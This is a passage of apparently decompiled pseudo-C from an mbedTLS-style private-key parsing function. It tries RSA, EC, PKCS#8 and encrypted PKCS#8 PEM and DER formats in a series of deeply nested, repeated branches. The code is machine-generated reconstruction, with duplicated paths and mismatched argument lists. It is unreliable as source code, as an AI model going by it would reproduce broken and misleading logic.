        int32_t v39 = mbedtls_pem_read_buffer((int32_t *)g7, "-----BEGIN RSA PRIVATE KEY-----", "-----END RSA PRIVATE KEY-----", a2, a4, a5, &v30); // 0x804ebcf
        g3 = v39;
        if (v39 == 0) {
            int32_t v40 = mbedtls_pk_info_from_type(1); // 0x804ebe5
            if (v40 != 0) {
                int32_t v41 = mbedtls_pk_setup((int32_t *)a1, v40); // 0x804ebf8
                g3 = v41;
                if (v41 == 0) {
                    // 0x804ec03
                    g4 = v31;
                    g1 = *(int32_t *)(a1 + 4);
                    g6 = v4;
                    int32_t v42 = pk_parse_key_pkcs1_der(a1, v40, (int32_t)"-----END RSA PRIVATE KEY-----"); // 0x804ec0f
                    g3 = v42;
                    if (v42 != 0) {
                        // 0x804ec1a
                        v37 = a1;
                        g1 = v37;
                        mbedtls_pk_free((char *)v37);
                        // branch -> 0x804ec25
                    }
                } else {
                    // 0x804ec1a
                    v37 = a1;
                    g1 = v37;
                    mbedtls_pk_free((char *)v37);
                    // branch -> 0x804ec25
                }
                // 0x804ec25
                mbedtls_pem_free((char *)g7);
                g5 = v3;
                return g3;
            }
            // 0x804ec40
            g5 = v3;
            return -0x3c80;
        }
        // 0x804edf1
        if (v39 == -0x1380) {
            // 0x804ed59
            g3 = -0x3b80;
            // branch -> 0x804eae5
            // 0x804eae5
            g5 = v3;
            return g3;
        }
        // 0x804edfc
        if (v39 == -0x1300) {
            // 0x804ed7e
            g3 = -0x3c00;
            // branch -> 0x804eae5
        } else {
            // 0x804ee07
            if (v39 == -0x1080) {
                // 0x804eb06
                v34 = g5;
                if (v34 == 0) {
                    v32 = "-----END RSA PRIVATE KEY-----";
                    // 0x804eac1
                    g4 = g5;
                    g1 = a1;
                    g6 = a2;
                    v14 = (int32_t)v32;
                    v6 = pk_parse_key_pkcs8_encrypted_der(a4, a5, v14, a2, a4);
                    g3 = v6;
                    if (v6 == 0) {
                        // 0x804eae5
                        g5 = v3;
                        return g3;
                    }
                    // 0x804ed88
                    v15 = a1;
                    g1 = v15;
                    mbedtls_pk_free((char *)v15);
                    if (g3 == -0x3b80) {
                        // 0x804eae5
                        g5 = v3;
                        return g3;
                    }
                    // 0x804ed9f
                    g6 = a2;
                    g4 = g5;
                    g1 = a1;
                    v7 = pk_parse_key_pkcs8_unencrypted_der(v15, a5, v14);
                    g1 = v7;
                    g3 = v7;
                    if (v7 == 0) {
                        // 0x804eae5
                        g5 = v3;
                        return g3;
                    }
                    // 0x804edb6
                    mbedtls_pk_free((char *)a1);
                    v8 = mbedtls_pk_info_from_type(1);
                    if (v8 != 0) {
                        // 0x804edd5
                        v16 = a1;
                        v9 = mbedtls_pk_setup((int32_t *)v16, v8);
                        g3 = v9;
                        if (v9 == 0) {
                            // 0x804ee27
                            g4 = g5;
                            g1 = *(int32_t *)(a1 + 4);
                            g6 = a2;
                            if (pk_parse_key_pkcs1_der(v16, v8, v14) != 0) {
                                // 0x804ee3f
                                v17 = a1;
                                g1 = v17;
                                mbedtls_pk_free((char *)v17);
                                v10 = mbedtls_pk_info_from_type(2);
                                if (v10 == 0) {
                                    // 0x804ec40
                                    g5 = v3;
                                    return -0x3c80;
                                }
                                // 0x804ee5e
                                v18 = a1;
                                g6 = v18;
                                if (mbedtls_pk_setup((int32_t *)v18, v10) == 0) {
                                    // 0x804ee75
                                    g4 = g5;
                                    g1 = *(int32_t *)(a1 + 4);
                                    g6 = a2;
                                    v11 = pk_parse_key_sec1_der(v18, v10, v14);
                                    g3 = v11;
                                    if (v11 != 0) {
                                        // 0x804ee8f
                                        v19 = a1;
                                        g1 = v19;
                                        g3 = -0x3d00;
                                        mbedtls_pk_free((char *)v19);
                                        // branch -> 0x804eae5
                                    }
                                }
                            }
                        } else {
                            // 0x804edea
                            g3 = 0;
                            // branch -> 0x804eae5
                        }
                        // 0x804eae5
                        g5 = v3;
                        return g3;
                    }
                    // 0x804ec40
                    g5 = v3;
                    return -0x3c80;
                }
                char * v43 = "-----END RSA PRIVATE KEY-----";
                // 0x804eb0a
                if (*(char *)(v34 + v20) != 0) {
                    // 0x804eb18
                    // branch -> 0x804eb1c
                    // 0x804eb1c
                    v21 = (char *)(v34 + v20);
                    if (*v21 != 0) {
                        // 0x804eac1
                        g4 = g5;
                        g1 = a1;
                        g6 = a2;
                        v14 = (int32_t)v43;
                        v6 = pk_parse_key_pkcs8_encrypted_der(a4, a5, v14, a2, a4);
                        g3 = v6;
                        if (v6 != 0) {
                            // 0x804ed88
                            v15 = a1;
                            g1 = v15;
                            mbedtls_pk_free((char *)v15);
                            if (g3 != -0x3b80) {
                                // 0x804ed9f
                                g6 = a2;
                                g4 = g5;
                                g1 = a1;
                                v7 = pk_parse_key_pkcs8_unencrypted_der(v15, a5, v14);
                                g1 = v7;
                                g3 = v7;
                                if (v7 != 0) {
                                    // 0x804edb6
                                    mbedtls_pk_free((char *)a1);
                                    v8 = mbedtls_pk_info_from_type(1);
                                    if (v8 == 0) {
                                        // 0x804ec40
                                        g5 = v3;
                                        return -0x3c80;
                                    }
                                    // 0x804edd5
                                    v16 = a1;
                                    v9 = mbedtls_pk_setup((int32_t *)v16, v8);
                                    g3 = v9;
                                    if (v9 == 0) {
                                        // 0x804ee27
                                        g4 = g5;
                                        g1 = *(int32_t *)(a1 + 4);
                                        g6 = a2;
                                        if (pk_parse_key_pkcs1_der(v16, v8, v14) != 0) {
                                            // 0x804ee3f
                                            v17 = a1;
                                            g1 = v17;
                                            mbedtls_pk_free((char *)v17);
                                            v10 = mbedtls_pk_info_from_type(2);
                                            if (v10 == 0) {
                                                // 0x804ec40
                                                g5 = v3;
                                                return -0x3c80;
                                            }
                                            // 0x804ee5e
                                            v18 = a1;
                                            g6 = v18;
                                            if (mbedtls_pk_setup((int32_t *)v18, v10) == 0) {
                                                // 0x804ee75
                                                g4 = g5;
                                                g1 = *(int32_t *)(a1 + 4);
                                                g6 = a2;
                                                v11 = pk_parse_key_sec1_der(v18, v10, v14);
                                                g3 = v11;
                                                if (v11 != 0) {
                                                    // 0x804ee8f
                                                    v19 = a1;
                                                    g1 = v19;
                                                    g3 = -0x3d00;
                                                    mbedtls_pk_free((char *)v19);
                                                    // branch -> 0x804eae5
                                                }
                                            }
                                        }
                                    } else {
                                        // 0x804edea
                                        g3 = 0;
                                        // branch -> 0x804eae5
                                    }
                                    // 0x804eae5
                                    g5 = v3;
                                    return g3;
                                }
                            }
                        }
                        // 0x804eae5
                        g5 = v3;
                        return g3;
                    }
                    // 0x804eb28
                    v36 = g7;
                    v22 = mbedtls_pem_read_buffer((int32_t *)v36, "-----BEGIN PRIVATE KEY-----", "-----END PRIVATE KEY-----", a2, 0, 0, &v30);
                    g3 = v22;
                    if (v22 == 0) {
                        // 0x804eb71
                        g4 = v31;
                        g6 = v4;
                        g1 = a1;
                        v23 = pk_parse_key_pkcs8_unencrypted_der(v36, (int32_t)"-----BEGIN PRIVATE KEY-----", (int32_t)"-----END PRIVATE KEY-----");
                        g1 = v23;
                        g3 = v23;
                        if (v23 != 0) {
                            // 0x804eb89
                            mbedtls_pk_free((char *)a1);
                            // branch -> 0x804ec25
                        }
                        // 0x804ec25
                        mbedtls_pem_free((char *)g7);
                        g5 = v3;
                        return g3;
                    }
                    // 0x804ecdb
                    if (v22 == -0x1080) {
                        // 0x804ece6
                        v32 = "-----END PRIVATE KEY-----";
                        if (*v21 == 0) {
                            // 0x804ecef
                            v28 = mbedtls_pem_read_buffer((int32_t *)g7, "-----BEGIN ENCRYPTED PRIVATE KEY-----", "-----END ENCRYPTED PRIVATE KEY-----", a2, 0, 0, &v30);
                            g3 = v28;
                            if (v28 == 0) {
                                // 0x804ed28
                                g4 = v31;
                                g6 = v4;
                                g1 = a1;
                                v29 = pk_parse_key_pkcs8_encrypted_der(a4, a5, (int32_t)"-----END ENCRYPTED PRIVATE KEY-----", a2, 0);
                                g1 = v29;
                                g3 = v29;
                                if (v29 != 0) {
                                    // 0x804eb89
                                    mbedtls_pk_free((char *)a1);
                                    // branch -> 0x804ec25
                                }
                                // 0x804ec25
                                mbedtls_pem_free((char *)g7);
                                g5 = v3;
                                return g3;
                            }
                            // 0x804ed63
                            if (v28 == -0x1080) {
                                v32 = "-----END ENCRYPTED PRIVATE KEY-----";
                                // 0x804eac1
                                g4 = g5;
                                g1 = a1;
                                g6 = a2;
                                v14 = (int32_t)v32;
                                v6 = pk_parse_key_pkcs8_encrypted_der(a4, a5, v14, a2, 0);
                                g3 = v6;
                                if (v6 != 0) {
                                    // 0x804ed88
                                    v15 = a1;
                                    g1 = v15;
                                    mbedtls_pk_free((char *)v15);
                                    if (g3 != -0x3b80) {
                                        // 0x804ed9f
                                        g6 = a2;
                                        g4 = g5;
                                        g1 = a1;
                                        v7 = pk_parse_key_pkcs8_unencrypted_der(v15, a5, v14);
                                        g1 = v7;
                                        g3 = v7;
                                        if (v7 != 0) {
                                            // 0x804edb6
                                            mbedtls_pk_free((char *)a1);
                                            v8 = mbedtls_pk_info_from_type(1);
                                            if (v8 == 0) {
                                                // 0x804ec40
                                                g5 = v3;
                                                return -0x3c80;
                                            }
                                            // 0x804edd5
                                            v16 = a1;
                                            v9 = mbedtls_pk_setup((int32_t *)v16, v8);
                                            g3 = v9;
                                            if (v9 == 0) {
                                                // 0x804ee27
                                                g4 = g5;
                                                g1 = *(int32_t *)(a1 + 4);
                                                g6 = a2;
                                                if (pk_parse_key_pkcs1_der(v16, v8, v14) != 0) {
                                                    // 0x804ee3f
                                                    v17 = a1;
                                                    g1 = v17;
                                                    mbedtls_pk_free((char *)v17);
                                                    v10 = mbedtls_pk_info_from_type(2);
                                                    if (v10 == 0) {
                                                        // 0x804ec40
                                                        g5 = v3;
                                                        return -0x3c80;
                                                    }
                                                    // 0x804ee5e
                                                    v18 = a1;
                                                    g6 = v18;
                                                    if (mbedtls_pk_setup((int32_t *)v18, v10) == 0) {
                                                        // 0x804ee75
                                                        g4 = g5;
                                                        g1 = *(int32_t *)(a1 + 4);
                                                        g6 = a2;
                                                        v11 = pk_parse_key_sec1_der(v18, v10, v14);
                                                        g3 = v11;
                                                        if (v11 != 0) {
                                                            // 0x804ee8f
                                                            v19 = a1;
                                                            g1 = v19;
                                                            g3 = -0x3d00;
                                                            mbedtls_pk_free((char *)v19);
                                                            // branch -> 0x804eae5
                                                        }
                                                    }
                                                }
                                            } else {
                                                // 0x804edea
                                                g3 = 0;
                                                // branch -> 0x804eae5
                                            }
                                            // 0x804eae5
                                            g5 = v3;
                                            return g3;
                                        }
                                    }
                                }
                            }
                            // 0x804eae5
                            g5 = v3;
                            return g3;
                        }
                        // 0x804eac1
                        g4 = g5;
                        g1 = a1;
                        g6 = a2;
                        v14 = (int32_t)v32;
                        v6 = pk_parse_key_pkcs8_encrypted_der(a4, a5, v14, a2, 0);
                        g3 = v6;
                        if (v6 != 0) {
                            // 0x804ed88
                            v15 = a1;
                            g1 = v15;
                            mbedtls_pk_free((char *)v15);
                            if (g3 != -0x3b80) {
                                // 0x804ed9f
                                g6 = a2;
                                g4 = g5;
                                g1 = a1;
                                v7 = pk_parse_key_pkcs8_unencrypted_der(v15, a5, v14);
                                g1 = v7;
                                g3 = v7;
                                if (v7 != 0) {
                                    // 0x804edb6
                                    mbedtls_pk_free((char *)a1);
                                    v8 = mbedtls_pk_info_from_type(1);
                                    if (v8 == 0) {
                                        // 0x804ec40
                                        g5 = v3;
                                        return -0x3c80;
                                    }
                                    // 0x804edd5
                                    v16 = a1;
                                    v9 = mbedtls_pk_setup((int32_t *)v16, v8);
                                    g3 = v9;
                                    if (v9 == 0) {
                                        // 0x804ee27
                                        g4 = g5;
                                        g1 = *(int32_t *)(a1 + 4);
                                        g6 = a2;
                                        if (pk_parse_key_pkcs1_der(v16, v8, v14) != 0) {
                                            // 0x804ee3f
                                            v17 = a1;
                                            g1 = v17;
                                            mbedtls_pk_free((char *)v17);
                                            v10 = mbedtls_pk_info_from_type(2);
                                            if (v10 == 0) {
                                                // 0x804ec40
                                                g5 = v3;
                                                return -0x3c80;
                                            }
                                            // 0x804ee5e
                                            v18 = a1;
                                            g6 = v18;
                                            if (mbedtls_pk_setup((int32_t *)v18, v10) == 0) {
                                                // 0x804ee75
                                                g4 = g5;
                                                g1 = *(int32_t *)(a1 + 4);
                                                g6 = a2;
                                                v11 = pk_parse_key_sec1_der(v18, v10, v14);
                                                g3 = v11;
                                                if (v11 != 0) {
                                                    // 0x804ee8f
                                                    v19 = a1;
                                                    g1 = v19;
                                                    g3 = -0x3d00;
                                                    mbedtls_pk_free((char *)v19);
                                                    // branch -> 0x804eae5
                                                }
                                            }
                                        }
                                    } else {
                                        // 0x804edea
                                        g3 = 0;
                                        // branch -> 0x804eae5
                                    }
                                    // 0x804eae5
                                    g5 = v3;
                                    return g3;
                                }
                            }
                        }
                    }
                    // 0x804eae5
                    g5 = v3;
                    return g3;
                }
                // 0x804ec54
                v24 = mbedtls_pem_read_buffer((int32_t *)g7, "-----BEGIN EC PRIVATE KEY-----", "-----END EC PRIVATE KEY-----", a2, a4, a5, &v30);
                g3 = v24;
                if (v24 == 0) {
                    // 0x804ec92
                    v25 = mbedtls_pk_info_from_type(2);
                    if (v25 == 0) {
                        // 0x804ec40
                        g5 = v3;
                        return -0x3c80;
                    }
                    // 0x804eca2
                    v38 = a1;
                    g6 = v38;
                    v26 = mbedtls_pk_setup((int32_t *)v38, v25);
                    g3 = v26;
                    if (v26 == 0) {
                        // 0x804ecbb
                        g4 = v31;
                        g1 = *(int32_t *)(a1 + 4);
                        g6 = v4;
                        v27 = pk_parse_key_sec1_der(v38, v25, (int32_t)"-----END EC PRIVATE KEY-----");
                        g3 = v27;
                        if (v27 != 0) {
                            // 0x804ec1a
                            v37 = a1;
                            g1 = v37;
                            mbedtls_pk_free((char *)v37);
                            // branch -> 0x804ec25
                        }
                    } else {
                        // 0x804ec1a
                        v37 = a1;
                        g1 = v37;
                        mbedtls_pk_free((char *)v37);
                        // branch -> 0x804ec25
                    }
                    // 0x804ec25
                    mbedtls_pem_free((char *)g7);
                    g5 = v3;
                    return g3;
                }
                // 0x804ed52
                if (v24 == -0x1380) {
                    // 0x804ed59
                    g3 = -0x3b80;
                    // branch -> 0x804eae5
                    // 0x804eae5
                    g5 = v3;
                    return g3;
                }
                // 0x804ed73
                if (v24 == -0x1300) {
                    // 0x804ed7e
                    g3 = -0x3c00;
                    // branch -> 0x804eae5
                } else {
                    // 0x804ee17
                    if (v24 == -0x1080) {
                        // 0x804eb18
                        v35 = g5;
                        v32 = "-----END EC PRIVATE KEY-----";
                        if (v35 != 0) {
                            v33 = "-----END EC PRIVATE KEY-----";
                            // 0x804eb1c
                            v21 = (char *)(v35 + v20);
                            if (*v21 == 0) {
                                // 0x804eb28
                                v36 = g7;
                                v22 = mbedtls_pem_read_buffer((int32_t *)v36, "-----BEGIN PRIVATE KEY-----", "-----END PRIVATE KEY-----", a2, 0, 0, &v30);
                                g3 = v22;
                                if (v22 == 0) {
                                    // 0x804eb71
                                    g4 = v31;
                                    g6 = v4;
                                    g1 = a1;
                                    v23 = pk_parse_key_pkcs8_unencrypted_der(v36, (int32_t)"-----BEGIN PRIVATE KEY-----", (int32_t)"-----END PRIVATE KEY-----");
                                    g1 = v23;
                                    g3 = v23;
                                    if (v23 != 0) {
                                        // 0x804eb89
                                        mbedtls_pk_free((char *)a1);
                                        // branch -> 0x804ec25
                                    }
                                    // 0x804ec25
                                    mbedtls_pem_free((char *)g7);
                                    g5 = v3;
                                    return g3;
                                }
                                // 0x804ecdb
                                if (v22 == -0x1080) {
                                    // 0x804ece6
                                    v32 = "-----END PRIVATE KEY-----";
                                    if (*v21 == 0) {
                                        // 0x804ecef
                                        v28 = mbedtls_pem_read_buffer((int32_t *)g7, "-----BEGIN ENCRYPTED PRIVATE KEY-----", "-----END ENCRYPTED PRIVATE KEY-----", a2, 0, 0, &v30);
                                        g3 = v28;
                                        if (v28 == 0) {
                                            // 0x804ed28
                                            g4 = v31;
                                            g6 = v4;
                                            g1 = a1;
                                            v29 = pk_parse_key_pkcs8_encrypted_der(a4, a5, (int32_t)"-----END ENCRYPTED PRIVATE KEY-----", a2, 0);
                                            g1 = v29;
                                            g3 = v29;
                                            if (v29 != 0) {
                                                // 0x804eb89
                                                mbedtls_pk_free((char *)a1);
                                                // branch -> 0x804ec25
                                            }
                                            // 0x804ec25
                                            mbedtls_pem_free((char *)g7);
                                            g5 = v3;
                                            return g3;
                                        }
                                        // 0x804ed63
                                        if (v28 == -0x1080) {
                                            v32 = "-----END ENCRYPTED PRIVATE KEY-----";
                                            // 0x804eac1
                                            g4 = g5;
                                            g1 = a1;
                                            g6 = a2;
                                            v14 = (int32_t)v32;
                                            v6 = pk_parse_key_pkcs8_encrypted_der(a4, a5, v14, a2, 0);
                                            g3 = v6;
                                            if (v6 != 0) {
                                                // 0x804ed88
                                                v15 = a1;
                                                g1 = v15;
                                                mbedtls_pk_free((char *)v15);
                                                if (g3 != -0x3b80) {
                                                    // 0x804ed9f
                                                    g6 = a2;
                                                    g4 = g5;
                                                    g1 = a1;
                                                    v7 = pk_parse_key_pkcs8_unencrypted_der(v15, a5, v14);
                                                    g1 = v7;
                                                    g3 = v7;
                                                    if (v7 != 0) {
                                                        // 0x804edb6
                                                        mbedtls_pk_free((char *)a1);
                                                        v8 = mbedtls_pk_info_from_type(1);
                                                        if (v8 == 0) {
                                                            // 0x804ec40
                                                            g5 = v3;
                                                            return -0x3c80;
                                                        }
                                                        // 0x804edd5
                                                        v16 = a1;
                                                        v9 = mbedtls_pk_setup((int32_t *)v16, v8);
                                                        g3 = v9;
                                                        if (v9 == 0) {
                                                            // 0x804ee27
                                                            g4 = g5;
                                                            g1 = *(int32_t *)(a1 + 4);
                                                            g6 = a2;
                                                            if (pk_parse_key_pkcs1_der(v16, v8, v14) != 0) {
                                                                // 0x804ee3f
                                                                v17 = a1;
                                                                g1 = v17;
                                                                mbedtls_pk_free((char *)v17);
                                                                v10 = mbedtls_pk_info_from_type(2);
                                                                if (v10 == 0) {
                                                                    // 0x804ec40
                                                                    g5 = v3;
                                                                    return -0x3c80;
                                                                }
                                                                // 0x804ee5e
                                                                v18 = a1;
                                                                g6 = v18;
                                                                if (mbedtls_pk_setup((int32_t *)v18, v10) == 0) {
                                                                    // 0x804ee75
                                                                    g4 = g5;
                                                                    g1 = *(int32_t *)(a1 + 4);
                                                                    g6 = a2;
                                                                    v11 = pk_parse_key_sec1_der(v18, v10, v14);
                                                                    g3 = v11;
                                                                    if (v11 != 0) {
                                                                        // 0x804ee8f
                                                                        v19 = a1;
                                                                        g1 = v19;
                                                                        g3 = -0x3d00;
                                                                        mbedtls_pk_free((char *)v19);
                                                                        // branch -> 0x804eae5
                                                                    }
                                                                }
                                                            }
                                                        } else {
                                                            // 0x804edea
                                                            g3 = 0;
                                                            // branch -> 0x804eae5
                                                        }
                                                        // 0x804eae5
                                                        g5 = v3;
                                                        return g3;
                                                    }
                                                }
                                            }
                                        }
                                        // 0x804eae5
                                        g5 = v3;
                                        return g3;
                                    }
                                    // 0x804eac1
                                    g4 = g5;
                                    g1 = a1;
                                    g6 = a2;
                                    v14 = (int32_t)v32;
                                    v6 = pk_parse_key_pkcs8_encrypted_der(a4, a5, v14, a2, 0);
                                    g3 = v6;
                                    if (v6 != 0) {
                                        // 0x804ed88
                                        v15 = a1;
                                        g1 = v15;
                                        mbedtls_pk_free((char *)v15);
                                        if (g3 != -0x3b80) {
                                            // 0x804ed9f
                                            g6 = a2;
                                            g4 = g5;
                                            g1 = a1;
                                            v7 = pk_parse_key_pkcs8_unencrypted_der(v15, a5, v14);
                                            g1 = v7;
                                            g3 = v7;
                                            if (v7 != 0) {
                                                // 0x804edb6
                                                mbedtls_pk_free((char *)a1);
                                                v8 = mbedtls_pk_info_from_type(1);
                                                if (v8 == 0) {
                                                    // 0x804ec40
                                                    g5 = v3;
                                                    return -0x3c80;
                                                }
                                                // 0x804edd5
                                                v16 = a1;
                                                v9 = mbedtls_pk_setup((int32_t *)v16, v8);
                                                g3 = v9;
                                                if (v9 == 0) {
                                                    // 0x804ee27
                                                    g4 = g5;
                                                    g1 = *(int32_t *)(a1 + 4);
                                                    g6 = a2;
                                                    if (pk_parse_key_pkcs1_der(v16, v8, v14) != 0) {
                                                        // 0x804ee3f
                                                        v17 = a1;
                                                        g1 = v17;
                                                        mbedtls_pk_free((char *)v17);
                                                        v10 = mbedtls_pk_info_from_type(2);
                                                        if (v10 == 0) {
                                                            // 0x804ec40
                                                            g5 = v3;
                                                            return -0x3c80;
                                                        }
                                                        // 0x804ee5e
                                                        v18 = a1;
                                                        g6 = v18;
                                                        if (mbedtls_pk_setup((int32_t *)v18, v10) == 0) {
                                                            // 0x804ee75
                                                            g4 = g5;
                                                            g1 = *(int32_t *)(a1 + 4);
                                                            g6 = a2;
                                                            v11 = pk_parse_key_sec1_der(v18, v10, v14);
                                                            g3 = v11;
                                                            if (v11 != 0) {
                                                                // 0x804ee8f
                                                                v19 = a1;
                                                                g1 = v19;
                                                                g3 = -0x3d00;
                                                                mbedtls_pk_free((char *)v19);
                                                                // branch -> 0x804eae5
                                                            }
                                                        }
                                                    }
                                                } else {
                                                    // 0x804edea
                                                    g3 = 0;
                                                    // branch -> 0x804eae5
                                                }
                                                // 0x804eae5
                                                g5 = v3;
                                                return g3;
                                            }
                                        }
                                    }
                                }
                                // 0x804eae5
                                g5 = v3;
                                return g3;
                            }
                            v32 = v33;
                        }
                        // 0x804eac1
                        g4 = g5;
                        g1 = a1;
                        g6 = a2;
                        v14 = (int32_t)v32;
                        v6 = pk_parse_key_pkcs8_encrypted_der(a4, a5, v14, a2, a4);
                        g3 = v6;
                        if (v6 != 0) {
                            // 0x804ed88
                            v15 = a1;
                            g1 = v15;
                            mbedtls_pk_free((char *)v15);
                            if (g3 != -0x3b80) {
                                // 0x804ed9f
                                g6 = a2;
                                g4 = g5;
                                g1 = a1;
                                v7 = pk_parse_key_pkcs8_unencrypted_der(v15, a5, v14);
                                g1 = v7;
                                g3 = v7;
                                if (v7 != 0) {
                                    // 0x804edb6
                                    mbedtls_pk_free((char *)a1);
                                    v8 = mbedtls_pk_info_from_type(1);
                                    if (v8 == 0) {
                                        // 0x804ec40
                                        g5 = v3;
                                        return -0x3c80;
                                    }
                                    // 0x804edd5
                                    v16 = a1;
                                    v9 = mbedtls_pk_setup((int32_t *)v16, v8);
                                    g3 = v9;
                                    if (v9 == 0) {
                                        // 0x804ee27
                                        g4 = g5;
                                        g1 = *(int32_t *)(a1 + 4);
                                        g6 = a2;
                                        if (pk_parse_key_pkcs1_der(v16, v8, v14) != 0) {
                                            // 0x804ee3f
                                            v17 = a1;
                                            g1 = v17;
                                            mbedtls_pk_free((char *)v17);
                                            v10 = mbedtls_pk_info_from_type(2);
                                            if (v10 == 0) {
                                                // 0x804ec40
                                                g5 = v3;
                                                return -0x3c80;
                                            }
                                            // 0x804ee5e
                                            v18 = a1;
                                            g6 = v18;
                                            if (mbedtls_pk_setup((int32_t *)v18, v10) == 0) {
                                                // 0x804ee75
                                                g4 = g5;
                                                g1 = *(int32_t *)(a1 + 4);
                                                g6 = a2;
                                                v11 = pk_parse_key_sec1_der(v18, v10, v14);
                                                g3 = v11;
                                                if (v11 != 0) {
                                                    // 0x804ee8f
                                                    v19 = a1;
                                                    g1 = v19;
                                                    g3 = -0x3d00;
                                                    mbedtls_pk_free((char *)v19);
                                                    // branch -> 0x804eae5
                                                }
                                            }
                                        }
                                    } else {
                                        // 0x804edea
                                        g3 = 0;
                                        // branch -> 0x804eae5
                                    }
                                    // 0x804eae5
                                    g5 = v3;
                                    return g3;
                                }
                            }
                        }
                    }
                }
                // 0x804eae5
                g5 = v3;
                return g3;
            }
        }
        // 0x804eae5
        g5 = v3;
        return g3;
    }
    // 0x804eb06
    v34 = v5;
    // branch -> 0x804eb0a
    // 0x804eb0a
    int32_t v44; // bp-92
    if (*(char *)(v34 + v20) == 0) {
        // 0x804ec54
        v24 = mbedtls_pem_read_buffer((int32_t *)g7, "-----BEGIN EC PRIVATE KEY-----", "-----END EC PRIVATE KEY-----", a2, a4, a5, &v30);
        g3 = v24;
        if (v24 == 0) {
            // 0x804ec92
            v25 = mbedtls_pk_info_from_type(2);
            if (v25 == 0) {
                // 0x804ec40
                g5 = v3;
                return -0x3c80;
            }
            // 0x804eca2
            v38 = a1;
            g6 = v38;
            v26 = mbedtls_pk_setup((int32_t *)v38, v25);
            g3 = v26;
            if (v26 == 0) {
                // 0x804ecbb
                g4 = v31;
                g1 = *(int32_t *)(a1 + 4);
                g6 = v4;
                v27 = pk_parse_key_sec1_der(v38, v25, (int32_t)"-----END EC PRIVATE KEY-----");
                g3 = v27;
                if (v27 != 0) {
                    // 0x804ec1a
                    v37 = a1;
                    g1 = v37;
                    mbedtls_pk_free((char *)v37);
                    // branch -> 0x804ec25
                }
            } else {
                // 0x804ec1a
                v37 = a1;
                g1 = v37;
                mbedtls_pk_free((char *)v37);
                // branch -> 0x804ec25
            }
            // 0x804ec25
            mbedtls_pem_free((char *)g7);
            g5 = v3;
            return g3;
        }
        // 0x804ed52
        if (v24 == -0x1380) {
            // 0x804ed59
            g3 = -0x3b80;
            // branch -> 0x804eae5
        } else {
            // 0x804ed73
            if (v24 == -0x1300) {
                // 0x804ed7e
                g3 = -0x3c00;
                // branch -> 0x804eae5
            } else {
                // 0x804ee17
                if (v24 == -0x1080) {
                    // 0x804eb18
                    v35 = g5;
                    v32 = "-----END EC PRIVATE KEY-----";
                    if (v35 != 0) {
                        v33 = "-----END EC PRIVATE KEY-----";
                        // 0x804eb1c
                        v21 = (char *)(v35 + v20);
                        if (*v21 == 0) {
                            // 0x804eb28
                            v36 = g7;
                            v22 = mbedtls_pem_read_buffer((int32_t *)v36, "-----BEGIN PRIVATE KEY-----", "-----END PRIVATE KEY-----", a2, 0, 0, &v30);
                            g3 = v22;
                            if (v22 == 0) {
                                // 0x804eb71
                                g4 = v31;
                                g6 = v4;
                                g1 = a1;
                                v23 = pk_parse_key_pkcs8_unencrypted_der(v36, (int32_t)"-----BEGIN PRIVATE KEY-----", (int32_t)"-----END PRIVATE KEY-----");
                                g1 = v23;
                                g3 = v23;
                                if (v23 != 0) {
                                    // 0x804eb89
                                    mbedtls_pk_free((char *)a1);
                                    // branch -> 0x804ec25
                                }
                            } else {
                                // 0x804ecdb
                                if (v22 == -0x1080) {
                                    // 0x804ece6
                                    v32 = "-----END PRIVATE KEY-----";
                                    if (*v21 == 0) {
                                        // 0x804ecef
                                        v28 = mbedtls_pem_read_buffer((int32_t *)g7, "-----BEGIN ENCRYPTED PRIVATE KEY-----", "-----END ENCRYPTED PRIVATE KEY-----", a2, 0, 0, &v30);
                                        g3 = v28;
                                        if (v28 == 0) {
                                            // 0x804ed28
                                            g4 = v31;
                                            g6 = v4;
                                            g1 = a1;
                                            v29 = pk_parse_key_pkcs8_encrypted_der(a4, a5, (int32_t)"-----END ENCRYPTED PRIVATE KEY-----", a2, 0);
                                            g1 = v29;
                                            g3 = v29;
                                            if (v29 != 0) {
                                                // 0x804eb89
                                                mbedtls_pk_free((char *)a1);
                                                // branch -> 0x804ec25
                                            }
                                            // 0x804ec25
                                            mbedtls_pem_free((char *)g7);
                                            g5 = v3;
                                            return g3;
                                        }
                                        // 0x804ed63
                                        if (v28 == -0x1080) {
                                            v32 = "-----END ENCRYPTED PRIVATE KEY-----";
                                            // 0x804eac1
                                            g4 = g5;
                                            g1 = a1;
                                            g6 = a2;
                                            v14 = (int32_t)v32;
                                            v6 = pk_parse_key_pkcs8_encrypted_der(a4, a5, v14, a2, 0);
                                            g3 = v6;
                                            if (v6 != 0) {
                                                // 0x804ed88
                                                v15 = a1;
                                                g1 = v15;
                                                v44 = v15;
                                                mbedtls_pk_free((char *)v15);
                                                if (g3 != -0x3b80) {
                                                    // 0x804ed9f
                                                    g6 = a2;
                                                    g4 = g5;
                                                    g1 = a1;
                                                    v7 = pk_parse_key_pkcs8_unencrypted_der(v44, a5, v14);
                                                    g1 = v7;
                                                    g3 = v7;
                                                    if (v7 != 0) {
                                                        // 0x804edb6
                                                        mbedtls_pk_free((char *)a1);
                                                        v8 = mbedtls_pk_info_from_type(1);
                                                        if (v8 == 0) {
                                                            // 0x804ec40
                                                            g5 = v3;
                                                            return -0x3c80;
                                                        }
                                                        // 0x804edd5
                                                        v16 = a1;
                                                        v9 = mbedtls_pk_setup((int32_t *)v16, v8);
                                                        g3 = v9;
                                                        if (v9 == 0) {
                                                            // 0x804ee27
                                                            g4 = g5;
                                                            g1 = *(int32_t *)(a1 + 4);
                                                            g6 = a2;
                                                            if (pk_parse_key_pkcs1_der(v16, v8, v14) != 0) {
                                                                // 0x804ee3f
                                                                v17 = a1;
                                                                g1 = v17;
                                                                mbedtls_pk_free((char *)v17);
                                                                v10 = mbedtls_pk_info_from_type(2);
                                                                if (v10 == 0) {
                                                                    // 0x804ec40
                                                                    g5 = v3;
                                                                    return -0x3c80;
                                                                }
                                                                // 0x804ee5e
                                                                v18 = a1;
                                                                g6 = v18;
                                                                if (mbedtls_pk_setup((int32_t *)v18, v10) == 0) {
                                                                    // 0x804ee75
                                                                    g4 = g5;
                                                                    g1 = *(int32_t *)(a1 + 4);
                                                                    g6 = a2;
                                                                    v11 = pk_parse_key_sec1_der(v18, v10, v14);
                                                                    g3 = v11;
                                                                    if (v11 != 0) {
                                                                        // 0x804ee8f
                                                                        v19 = a1;
                                                                        g1 = v19;
                                                                        g3 = -0x3d00;
                                                                        mbedtls_pk_free((char *)v19);
                                                                        // branch -> 0x804eae5
                                                                    }
                                                                }
                                                            }
                                                        } else {
                                                            // 0x804edea
                                                            g3 = 0;
                                                            // branch -> 0x804eae5
                                                        }
